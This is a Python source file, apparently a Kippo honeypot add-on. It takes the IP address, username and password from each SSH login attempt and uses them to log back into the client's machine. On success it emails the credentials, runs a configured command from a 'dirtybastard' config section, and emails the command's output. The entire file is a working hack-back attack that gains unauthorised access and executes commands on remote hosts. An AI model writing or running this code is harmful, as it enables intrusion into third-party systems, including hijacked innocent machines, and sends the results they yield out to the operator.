import threading
from paramiko import SSHClient, AutoAddPolicy

from kippo.core.config import config
from kippo.core.sendemail import sendEmail

class SSHLogin(object):
    def __init__(self, clientip,  username,  password):
        self.clientip = clientip
        self.username = username
        self.password = password
        
        # Launch login thread
        threading.Thread(target=self.loginThread).start()
        print "LOGIN THREAD LAUCHED."


    def loginThread(self):
        client = SSHClient()
        client.set_missing_host_key_policy(AutoAddPolicy())
    
        loginDetailString = self.username + "@" + self.clientip +" (" + self.password + ")"
        print "Attempting login with",  loginDetailString
        
        try:
            client.connect(hostname=self.clientip,  username=self.username,  password=self.password)
        except:   
            print "Authentication failed for",  loginDetailString
            return
            
        sendEmail('New login success!',  
            "Successfully logged in to remote box: " + loginDetailString)
            
        configName = "not_root_command"
        if (self.username == "root"):
            configName = "root_command"

        command = config().get('dirtybastard',  configName)[1:-1] # Remove quotes
            
        print "SUCCESS! Running command: " + command
        stdin, stdout, stderr = client.exec_command(command)
    
        print "stdout:"
        stdoutString = ""
        for line in stdout.readlines():
            print line.strip()
            stdoutString = stdoutString + line.strip() + "\n"
            
        sendEmail('Output from command', 
            "stdout:\n" + stdoutString);
